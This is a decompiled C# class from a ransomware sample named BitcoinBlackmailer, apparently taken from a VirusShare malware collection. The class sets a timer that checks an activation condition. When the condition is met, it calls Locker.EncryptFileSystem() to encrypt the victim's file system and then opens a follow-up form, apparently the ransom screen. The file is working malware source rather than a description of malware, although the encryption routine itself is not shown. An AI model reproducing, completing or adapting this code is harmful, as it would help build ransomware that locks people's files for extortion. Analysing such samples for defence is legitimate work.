// Decompiled with JetBrains decompiler
// Type: Main.FormBackground
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 8BE9EE5B-D2E1-4CD7-973E-883BE52B7291
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-80a6681b00056a487bba1b66c046b798dfe18bf37aa30d8a4a1be968b9add997.exe

using Main.Tools;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace Main
{
  public class FormBackground : Form
  {
    private IContainer components;
    private Timer timerActivateChecker;

    public FormBackground()
    {
      this.InitializeComponent();
      this.timerActivateChecker.Interval = Config.TimerActivateCheckerInterval;
      this.timerActivateChecker.Enabled = true;
    }

    private void timerActivateChecker_Tick(object sender, EventArgs e)
    {
      if (Config.Activated || !Hacking.ShouldActivate())
        return;
      Config.Activated = true;
      FormBackground.ImposeRestrictions();
      new FormGame().Show((IWin32Window) this);
    }

    private static void ImposeRestrictions() => Locker.EncryptFileSystem();

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.timerActivateChecker = new Timer(this.components);
      this.SuspendLayout();
      this.timerActivateChecker.Enabled = true;
      this.timerActivateChecker.Tick += new EventHandler(this.timerActivateChecker_Tick);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(284, 262);
      this.Name = nameof (FormBackground);
      this.Text = "Form1";
      this.ResumeLayout(false);
    }
  }
}
